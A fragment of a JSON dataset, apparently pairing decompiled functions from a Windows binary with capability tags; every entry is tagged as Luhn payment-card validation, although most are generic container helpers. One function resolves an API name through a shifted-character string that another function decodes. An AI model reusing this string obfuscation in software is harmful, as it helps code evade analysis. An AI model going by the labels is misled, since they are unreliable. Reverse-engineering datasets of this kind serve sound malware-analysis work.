        "decompiled_code": "\nvoid fcn.180016360(int64_t arg1, ulong arg2)\n\n{\n    fcn.180001ef0(arg1 + 0x1d8, arg2);\n    fcn.180001ef0(arg1 + 0x1b0, arg2);\n    fcn.180001ef0(arg1 + 0x188, arg2);\n    fcn.180001ef0(arg1 + 0x160, arg2);\n    fcn.180001ef0(arg1 + 0x138, arg2);\n    fcn.180001ef0(arg1 + 0x110, arg2);\n    fcn.180001ef0(arg1 + 0xe8, arg2);\n    fcn.180001ef0(arg1 + 0xc0, arg2);\n    fcn.180001ef0(arg1 + 0x98, arg2);\n    fcn.180001ef0(arg1 + 0x70, arg2);\n    fcn.180001ef0(arg1 + 0x48, arg2);\n    fcn.180001ef0(arg1 + 0x20, arg2);\n    return;\n}\n",
        "token_count": 255
    },
    "18001693": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180016930(void)\n\n{\n    uint32_t uVar1;\n    ulong *puVar2;\n    uint32_t uStack20;\n    \n    uVar1 = fcn.18001c5c0(0x18004af20);\n    for (uStack20 = 0; uStack20 < uVar1; uStack20 = uStack20 + 1) {\n        puVar2 = fcn.18001c5e0(0x18004af20);\n        (**0x18004ac58)(*puVar2);\n        fcn.18001c770(0x18004af20);\n    }\n    return;\n}\n",
        "token_count": 144
    },
    "180017ad": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180017ad0(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    uchar auStack88 [40];\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint64_t uStack16;\n    \n    uStack16 = *0x180040248 ^ auStack88;\n    uStack48 = 0x10;\n    uStack40 = 7;\n    uStack32 = 0;\n    uStack24 = 10000;\n    *0x180049d98 = arg1;\n    uStack44 = arg1;\n    uStack36 = arg2;\n    uStack28 = arg3;\n    pcVar1 = fcn.18001e5f0(\"TfuTfswjdfTubuvt\");\n    (*pcVar1)(*0x180049d90, &uStack48);\n    fcn.180023980(uStack16 ^ auStack88);\n    return;\n}\n",
        "token_count": 240
    },
    "18001c2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001c2c0(ulong arg1)\n\n{\n    ulong *puVar1;\n    uchar auStack32 [8];\n    uchar auStack24 [24];\n    \n    puVar1 = fcn.18001c860(arg1, auStack32);\n    fcn.18001c7d0(arg1, auStack24, *puVar1);\n    return;\n}\n",
        "token_count": 86
    },
    "18001c31": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001c310(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong arg4;\n    \n    arg4 = fcn.180001470(arg2);\n    fcn.180002410(arg1, arg2, arg3, arg4);\n    return;\n}\n",
        "token_count": 65
    },
    "18001c35": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001c350(int64_t *arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    \n    uVar3 = fcn.18000eb30(arg2);\n    cVar2 = fcn.18001c9a0(arg1, uVar3);\n    if (cVar2 == '\\0') {\n        if (arg1[1] == arg1[2]) {\n            fcn.18001c9f0(arg1, 1);\n        }\n        fcn.18001ccc0(arg1, arg1[1], arg1[1]);\n        uVar3 = fcn.18000eb30(arg2);\n        fcn.18001d930(arg1 + 3, arg1[1], uVar3);\n        arg1[1] = arg1[1] + 4;\n    }\n    else {\n        iVar4 = fcn.18000eb30(arg2);\n        iVar1 = *arg1;\n        if (arg1[1] == arg1[2]) {\n            fcn.18001c9f0(arg1, 1);\n        }\n        fcn.18001ccc0(arg1, arg1[1], arg1[1]);\n        uVar3 = fcn.18000eb30(*arg1 + (iVar4 - iVar1 >> 2) * 4);\n        fcn.18001d930(arg1 + 3, arg1[1], uVar3);\n        arg1[1] = arg1[1] + 4;\n    }\n    return;\n}\n",
        "token_count": 359
    },
    "18001c4b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001c4b0(ulong arg1)\n\n{\n    fcn.18001ca80(arg1);\n    fcn.18000bcf0(arg1);\n    return;\n}\n",
        "token_count": 44
    },
    "18001c54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18001c540(ulong arg1, ulong arg2)\n\n{\n    ulong arg2_00;\n    \n    arg2_00 = fcn.18000eb30(arg2);\n    fcn.18000e8c0(arg1, arg2_00);\n    return arg1;\n}\n",
        "token_count": 67
    },
    "18001c57": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18001c570(int64_t *arg1, int64_t arg2)\n\n{\n    return arg2 * 0x28 + *arg1;\n}\n",
        "token_count": 40
    },
    "18001c59": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001c590(ulong arg1)\n\n{\n    fcn.18001cc20(arg1);\n    fcn.18000bcf0(arg1);\n    return;\n}\n",
        "token_count": 42
    },
    "18001c62": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001c620(int64_t *arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    ulong arg2_00;\n    int64_t iVar3;\n    \n    arg2_00 = fcn.18000eb30(arg2);\n    cVar2 = fcn.18001c9a0(arg1, arg2_00);\n    if (cVar2 == '\\0') {\n        if (arg1[1] == arg1[2]) {\n            fcn.18001cb90(arg1, 1);\n        }\n        fcn.18001ccc0(arg1, arg1[1], arg1[1]);\n        fcn.18001d9b0(arg1 + 3, arg1[1], arg2);\n        arg1[1] = arg1[1] + 8;\n    }\n    else {\n        iVar3 = fcn.18000eb30(arg2);\n        iVar1 = *arg1;\n        if (arg1[1] == arg1[2]) {\n            fcn.18001cb90(arg1, 1);\n        }\n        fcn.18001ccc0(arg1, arg1[1], arg1[1]);\n        fcn.18001d970(arg1 + 3, arg1[1], *arg1 + (iVar3 - iVar1 >> 3) * 8);\n        arg1[1] = arg1[1] + 8;\n    }\n    return;\n}\n",
        "token_count": 328
    },
    "18001c77": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001c770(int64_t arg1)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.18001cb50(arg1);\n    if (cVar1 == '\\0') {\n        fcn.18000ca40(arg1 + 0x18, *(arg1 + 8) + -8);\n        *(arg1 + 8) = *(arg1 + 8) + -8;\n    }\n    return;\n}\n",
        "token_count": 102
    },
    "18001c7d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18001c7d0(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong *puVar1;\n    ulong arg2_00;\n    ulong arg1_00;\n    uchar auStack24 [8];\n    uchar auStack16 [16];\n    \n    puVar1 = fcn.18001ce60(arg1, auStack24);\n    arg2_00 = fcn.18001cea0(arg3, *puVar1);\n    fcn.18001cd40(arg1, arg2_00, 1);\n    arg1_00 = fcn.18001ce60(arg1, auStack16);\n    fcn.18001d420(arg1_00, arg2, arg2_00);\n    return arg2;\n}\n",
        "token_count": 169
    },
    "18001c86": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18001c860(int64_t arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.1800034b0(arg1);\n    fcn.18001d3e0(arg2, iVar1 + *(arg1 + 0x10), arg1);\n    return arg2;\n}\n",
        "token_count": 77
    },
    "18001c8a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18001c8a0(ulong *arg1, ulong arg2)\n\n{\n    fcn.18000da40(arg2, *arg1, arg1);\n    return arg2;\n}\n",
        "token_count": 46
    },
    "18001c8d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18001c8d0(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    char cVar1;\n    ulong uStack40;\n    ulong uStack32;\n    ulong uStack24;\n    ulong uStack16;\n    \n    fcn.18001d040(arg1, &uStack40, arg3);\n    fcn.18001d040(arg1, &uStack32, arg4);\n    cVar1 = fcn.18001d470(&uStack40, &uStack32);\n    if (cVar1 != '\\0') {\n        uStack24 = fcn.18001d9f0(uStack32, *(arg1 + 8), uStack40);\n        fcn.18001d0c0(arg1, uStack24, *(arg1 + 8));\n        *(arg1 + 8) = uStack24;\n    }\n    uStack16 = uStack40;\n    fcn.18001d040(arg1, arg2, uStack40);\n    return arg2;\n}\n",
        "token_count": 233
    },
    "18001c9a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar fcn.18001c9a0(uint64_t *arg1, uint64_t arg2)\n\n{\n    uchar uStack24;\n    \n    if ((arg2 < arg1[1]) && (*arg1 < arg2 || *arg1 == arg2)) {\n        uStack24 = 1;\n    }\n    else {\n        uStack24 = 0;\n    }\n    return uStack24;\n}\n",
        "token_count": 89
    },
    "18001c9f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001c9f0(ulong arg1, int64_t arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    ulong arg2_00;\n    \n    uVar1 = fcn.18001d080(arg1);\n    iVar2 = fcn.18001d0a0(arg1);\n    if (iVar2 - arg2 < uVar1) {\n        fcn.18000f030(arg1);\n    }\n    else {\n        uVar3 = fcn.18001d020(arg1);\n        if (uVar3 < uVar1 + arg2) {\n            arg2_00 = fcn.18001d100(arg1, uVar1 + arg2);\n            fcn.18001cee0(arg1, arg2_00);\n        }\n    }\n    return;\n}\n",
        "token_count": 192
    },
    "18001cb2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18001cb20(int64_t arg1, ulong arg2)\n\n{\n    fcn.18000da40(arg2, *(arg1 + 8), arg1);\n    return arg2;\n}\n",
        "token_count": 47
    },
    "18001cb9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001cb90(ulong arg1, int64_t arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    ulong arg2_00;\n    \n    uVar1 = fcn.18001c5c0(arg1);\n    iVar2 = fcn.18001d310(arg1);\n    if (iVar2 - arg2 < uVar1) {\n        fcn.18000f030(arg1);\n    }\n    else {\n        uVar3 = fcn.18001d2f0(arg1);\n        if (uVar3 < uVar1 + arg2) {\n            arg2_00 = fcn.18001d330(arg1, uVar1 + arg2);\n            fcn.18001d1b0(arg1, arg2_00);\n        }\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "18001ccd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001ccd0(ulong arg1)\n\n{\n    fcn.18001d4e0(arg1);\n    return;\n}\n",
        "token_count": 32
    },
    "18001ccf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.18001ccf0(ulong *arg1, ulong *arg2, ulong arg3)\n\n{\n    ulong *puVar1;\n    ulong auStack24 [3];\n    \n    auStack24[0] = *arg1;\n    puVar1 = fcn.18001d4b0(auStack24, arg3);\n    *arg2 = *puVar1;\n    return arg2;\n}\n",
        "token_count": 93
    },
    "18001ce6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18001ce60(ulong arg1, ulong arg2)\n\n{\n    ulong arg2_00;\n    \n    arg2_00 = fcn.1800034b0(arg1);\n    fcn.18001d3e0(arg2, arg2_00, arg1);\n    return arg2;\n}\n",
        "token_count": 71
    },
    "18001d04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18001d040(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    fcn.18000da40(arg2, arg3, arg1);\n    return arg2;\n}\n",
        "token_count": 46
    },
    "18001d0a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001d0a0(int64_t arg1)\n\n{\n    fcn.18001d590(arg1 + 0x18);\n    return;\n}\n",
        "token_count": 38
    },
    "18001d0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001d0c0(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    fcn.18001da80(arg2, arg3, arg1 + 0x18);\n    return;\n}\n",
        "token_count": 52
    },
    "18001d10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.18001d100(ulong arg1, uint64_t arg2)\n\n{\n    int64_t iVar1;\n    uint64_t uStack40;\n    uint64_t uStack24;\n    \n    uStack24 = fcn.18001d020(arg1);\n    iVar1 = fcn.18001d0a0(arg1);\n    if (iVar1 - uStack24 / 2 < uStack24) {\n        uStack24 = 0;\n    }\n    else {\n        uStack24 = uStack24 + uStack24 / 2;\n    }\n    uStack40 = uStack24;\n    if (uStack24 < arg2) {\n        uStack40 = arg2;\n    }\n    return uStack40;\n}\n",
        "token_count": 164
    },
    "18001d31": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001d310(int64_t arg1)\n\n{\n    fcn.18001d5f0(arg1 + 0x18);\n    return;\n}\n",
        "token_count": 38
    },
    "18001d3e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18001d3e0(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    fcn.18001d660(arg1, arg2, arg3);\n    return arg1;\n}\n",
        "token_count": 48
    },
    "18001d42": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.18001d420(ulong *arg1, ulong *arg2, ulong arg3)\n\n{\n    ulong *puVar1;\n    ulong auStack24 [3];\n    \n    auStack24[0] = *arg1;\n    puVar1 = fcn.18001d630(auStack24, arg3);\n    *arg2 = *puVar1;\n    return arg2;\n}\n",
        "token_count": 90
    },
    "18001d47": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.18001d470(ulong arg1, ulong arg2)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.18001d6e0(arg1, arg2);\n    return cVar1 == '\\0';\n}\n",
        "token_count": 56
    },
    "18001d4b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001d4b0(ulong arg1, int64_t arg2)\n\n{\n    fcn.18001d730(arg1, -arg2);\n    return;\n}\n",
        "token_count": 42
    },
    "18001d57": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001d570(ulong arg1, ulong arg2)\n\n{\n    fcn.18001db10(arg2, 0);\n    return;\n}\n",
        "token_count": 37
    },
    "18001d5d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001d5d0(ulong arg1, ulong arg2)\n\n{\n    fcn.18001db90(arg2, 0);\n    return;\n}\n",
        "token_count": 39
    },
    "18001d63": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18001d630(ulong arg1, ulong arg2)\n\n{\n    fcn.18001d760(arg1, arg2);\n    return arg1;\n}\n",
        "token_count": 39
    },
    "18001d6e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.18001d6e0(int64_t *arg1, int64_t *arg2)\n\n{\n    fcn.18000dfb0(arg1, arg2);\n    return *arg1 == *arg2;\n}\n",
        "token_count": 52
    },
    "18001d73": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18001d730(ulong arg1, ulong arg2)\n\n{\n    fcn.18001d790(arg1, arg2);\n    return arg1;\n}\n",
        "token_count": 39
    },
    "18001d7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18001d7c0(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    \n    uVar1 = fcn.18001dc80(arg3, 0, arg2);\n    uVar1 = fcn.18000eb30(uVar1);\n    fcn.18000e4d0(arg1, uVar1);\n    return arg1;\n}\n",
        "token_count": 92
    },
    "18001d82": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18001d820(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    \n    uVar1 = fcn.1800020f0(arg3);\n    iVar2 = fcn.18001dcc0(arg2);\n    iVar3 = fcn.1800020f0(arg2);\n    if (iVar2 - iVar3 < uVar1) {\n        iVar2 = fcn.18001dcc0(arg3);\n        iVar3 = fcn.1800020f0(arg3);\n        uVar1 = fcn.1800020f0(arg2);\n        if (uVar1 <= iVar2 - iVar3) {\n            uVar4 = fcn.18001dc40(arg3, 0, arg2);\n            uVar4 = fcn.18000eb30(uVar4);\n            fcn.18000e4d0(arg1, uVar4);\n            return arg1;\n        }\n    }\n    uVar4 = fcn.18001dc10(arg2, arg3);\n    uVar4 = fcn.18000eb30(uVar4);\n    fcn.18000e4d0(arg1, uVar4);\n    return arg1;\n}\n",
        "token_count": 290
    },
    "18001d93": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001d930(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong arg3_00;\n    \n    arg3_00 = fcn.18000eb30(arg3);\n    fcn.18001dcd0(arg1, arg2, arg3_00);\n    return;\n}\n",
        "token_count": 71
    },
    "18001d97": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001d970(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong arg3_00;\n    \n    arg3_00 = fcn.18000eb30(arg3);\n    fcn.18001e120(arg1, arg2, arg3_00);\n    return;\n}\n",
        "token_count": 70
    },
    "18001d9b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001d9b0(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong arg3_00;\n    \n    arg3_00 = fcn.18000eb30(arg3);\n    fcn.18001dd40(arg1, arg2, arg3_00);\n    return;\n}\n",
        "token_count": 72
    },
    "18001d9f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001d9f0(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    fcn.18000f5c0(arg1, arg3);\n    fcn.18001e190(arg1, arg2, arg3);\n    return;\n}\n",
        "token_count": 62
    },
    "18001da4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001da40(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    fcn.18001e1f0(arg2, arg3, arg4, arg1 + 0x18);\n    return;\n}\n",
        "token_count": 59
    },
    "18001da8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001da80(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    fcn.18000f5c0(arg1, arg2);\n    fcn.18001e2d0(arg1, arg2, arg3);\n    return;\n}\n",
        "token_count": 62
    },
    "18001dad": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001dad0(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    fcn.18001e260(arg2, arg3, arg4, arg1 + 0x18);\n    return;\n}\n",
        "token_count": 57
    },
    "18001dc1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001dc10(ulong arg1, ulong arg2)\n\n{\n    fcn.180002aa0(arg1, arg2, 0, 0xffffffffffffffff);\n    return;\n}\n",
        "token_count": 45
    },
    "18001dc4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001dc40(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    fcn.18001dd70(arg1, arg2, arg3, 0);\n    return;\n}\n",
        "token_count": 47
    },
    "18001dc8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001dc80(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong arg4;\n    \n    arg4 = fcn.180001470(arg3);\n    fcn.18001df90(arg1, arg2, arg3, arg4);\n    return;\n}\n",
        "token_count": 66
    },
    "18001e19": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18001e190(int64_t arg1, int64_t arg2, int64_t arg3)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = arg2 - arg1 >> 2;\n    fcn.180023b60(arg3, arg1, iVar1 << 2);\n    return arg3 + iVar1 * 4;\n}\n",
        "token_count": 83
    },
    "18001e1f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001e1f0(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    fcn.18000f5c0(arg1, arg3);\n    fcn.180010200(arg1);\n    fcn.18001e360(arg1, arg2, arg3, arg4);\n    return;\n}\n",
        "token_count": 79
    },
    "18001e26": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001e260(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    fcn.18000f5c0(arg1, arg3);\n    fcn.180010200(arg1);\n    fcn.18001e3c0(arg1, arg2, arg3, arg4);\n    return;\n}\n",
        "token_count": 79
    },
    "18001e36": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18001e360(int64_t arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    iVar1 = arg2 - arg1 >> 2;\n    iVar2 = fcn.180023b60(arg3, arg1, iVar1 << 2);\n    return iVar2 + iVar1 * 4;\n}\n",
        "token_count": 95
    },
    "18001e43": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001e430(char *arg1)\n\n{\n    char *pcStack24;\n    \n    for (pcStack24 = arg1; *pcStack24 != '\\0'; pcStack24 = pcStack24 + 1) {\n        *pcStack24 = *pcStack24 + -1;\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "18001f3e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001f3e0(ulong arg1, int64_t arg2, ulong arg3)\n\n{\n    ulong arg3_00;\n    ulong arg2_00;\n    uchar auStack184 [32];\n    uchar auStack152 [56];\n    uchar auStack96 [40];\n    int32_t iStack56;\n    int64_t iStack48;\n    int32_t iStack40;\n    uchar uStack36;\n    ulong uStack32;\n    uint64_t uStack24;\n    \n    uStack32 = 0xfffffffffffffffe;\n    uStack24 = *0x180040248 ^ auStack184;\n    fcn.180001000(auStack152, *(arg2 + 4));\n    iStack56 = fcn.180001180(auStack152);\n    iStack48 = fcn.180001190(auStack152);\n    fcn.180001e30(auStack96);\n    fcn.1800234f0(auStack96);\n    fcn.180001f80(auStack96, arg3);\n    fcn.1800234f0(auStack96);\n    fcn.1800234f0(auStack96);\n    for (iStack40 = 1; iStack40 < iStack56; iStack40 = iStack40 + 1) {\n        fcn.1800234f0(auStack96);\n        fcn.180001f80(auStack96, *(iStack48 + iStack40 * 8));\n        fcn.1800234f0(auStack96);\n        fcn.1800234f0(auStack96);\n    }\n    fcn.1800011f0(*(arg2 + 4), 0x4000);\n    arg3_00 = fcn.1800020d0(auStack96);\n    arg2_00 = 0x4000;\n    fcn.180001590(*(arg2 + 4), 0x4000, arg3_00);\n    uStack36 = 1;\n    fcn.180001ef0(auStack96, arg2_00);\n    fcn.180001120(auStack152);\n    fcn.180023980(uStack24 ^ auStack184);\n    return;\n}\n",
        "token_count": 493
    },
    "1800234c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800234c0(ulong arg1, ulong arg2)\n\n{\n    fcn.18001dc10(arg1, arg2);\n    return;\n}\n",
        "token_count": 38
    },
    "1800234f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800234f0(ulong arg1)\n\n{\n    fcn.180023560(arg1, 1);\n    return;\n}\n",
        "token_count": 33
    },
    "18002352": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180023520(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong arg4;\n    \n    arg4 = fcn.180001470(arg2);\n    fcn.180023610(arg1, arg2, arg3, arg4);\n    return;\n}\n",
        "token_count": 64
    },
    "180023ef": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180023ef8(ulong arg1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    char *apcStackX16 [3];\n    code *apcStack40 [4];\n    \n    do {\n        iVar3 = fcn.180024064(arg1);\n        if (iVar3 != 0) {\n            return;\n        }\n        iVar2 = fcn.180026008(arg1);\n    } while (iVar2 != 0);\n    if ((*0x180048cb8 & 1) == 0) {\n        *0x180048cb8 = *0x180048cb8 | 1;\n        apcStackX16[0] = \"bad allocation\";\n        fcn.1800239a8(0x180048ca0, apcStackX16);\n        *0x180048ca0 = vtable.std::bad_alloc.0;\n        fcn.180024f84(0x180035148);\n    }\n    fcn.180023b1c(apcStack40);\n    apcStack40[0] = vtable.std::bad_alloc.0;\n    fcn.180025954(apcStack40, 0x18003e970);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 294
    },
    "18002402": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
